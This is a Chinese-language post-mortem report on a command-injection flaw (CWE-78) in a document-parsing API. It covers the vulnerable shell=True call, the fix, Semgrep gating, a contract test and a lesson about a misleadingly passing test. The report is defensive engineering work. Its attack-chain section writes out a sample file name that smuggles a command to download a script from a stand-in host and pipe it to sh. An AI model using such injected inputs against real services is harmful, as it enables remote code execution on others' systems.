# 缺陷分析报告 · SEED-002 命令注入（CWE-78）

## 1. 缺陷摘要

| 项 | 内容 |
|---|---|
| 编号 | SEED-002 |
| 类型 | OS Command Injection（CWE-78） |
| 严重级别 | 高（可执行任意系统命令） |
| 发现方式 | **Semgrep 静态扫描**在 PR 阶段自动报出 |
| 状态 | 已修复 |

## 2. 影响面

`POST /api/v1/documents/{doc_id}/parse` 一个入口。上传接口只校验后缀与 MIME，**不校验文件名里的 shell 元字符**，因此攻击链成立：

```
上传文件名 = "probe; curl http://evil/x.sh | sh; .pdf"
        ↓
parse_document 执行 f"file {filename}" 并 shell=True
        ↓
shell 把 ; 当作命令分隔符 → 执行任意命令
```

由于服务以应用进程身份运行，攻击者可读写文件、外连、横向移动。

## 3. 根因

```python
result = subprocess.run(
    f"file {filename}",   # ① 字符串拼接
    shell=True,           # ② 交给 shell 解释
    ...
)
```

两个条件叠加才构成漏洞：

- **直接原因**：把外部可控字符串拼进命令，且 `shell=True` 让 shell 解释元字符
- **根本原因**：把"调用一个程序"误当成"执行一段命令"。前者应该是参数数组，后者才需要 shell

只去掉其中一个也能缓解（比如只加引号转义），但正确做法是**同时去掉两个**：
不需要 shell 展开时，`shell=True` 本身就是不必要的攻击面。

## 4. 修复

```python
result = subprocess.run(
    ["file", filename],   # 参数列表：文件名整体作为一个 argv 元素
    shell=False,          # 不经 shell，元字符没有解释机会
    capture_output=True,
    text=True,
)
```

代价：失去了 shell 的展开能力（管道、通配符、变量替换）。这里本来也不需要。

## 5. 防复发

| 措施 | 说明 |
|---|---|
| **门禁前置** | `sast-scan` 成为 required check，同类写法在 PR 阶段就被拦下，不进主干 |
| 规则可扩展 | `security/semgrep-rules.yaml` 现有 3 条规则（shell=True / eval-exec / yaml.load），新增模式只需加一条 |
| **契约测试** | `test_parse_does_not_use_shell` 断言 `shell is False` 且命令是参数列表 |
| 同类接口推广 | 任何新增的"调用外部程序"逻辑都必须走参数列表 |

**这个测试防的是哪类重复问题**：所有"把外部输入拼进命令行"的写法。
它不依赖具体文件名，而是直接锁住调用形态——只要有人改回 `shell=True` 或字符串拼接，测试立刻红。

## 6. 证据链

| 阶段 | 结果 |
|---|---|
| **扫描发现** | `sast-scan: failure`，定位 `app/main.py:138-143`，规则 `python-subprocess-shell-true` |
| 门禁阻断 | `sast-scan` 设为 required 后，PR #4 变 `blocked` |
| **测试先红** | 修复前运行契约测试：`assert True is False`（shell=True） |
| 修复 | 参数列表 + `shell=False` |
| 回归 | 18 passed；semgrep 退出码 0；`sast-scan` 转 success |

## 7. 额外教训：测试假绿

第一版测试写的是"上传带 `; echo MARKER` 的文件名 → 断言输出里没有 MARKER"，它在本地**通过了**，但通过的原因是错的：

1. Windows 没有 `file` 命令，`shell=True` 执行失败
2. 输出是 GBK 编码，`text=True` 按 UTF-8 解码抛异常
3. 捕获到的 stdout 为空 → "MARKER 不在输出里" 恰好成立

**结论：断言"输出里没有某个字符串"来判断注入是否被防住，容易被编码和环境差异骗过。断言调用形态（`shell=False` + 参数列表）更可靠。**

这个教训比缺陷本身更值钱——它说明"测试通过"和"问题被验证"是两件事。
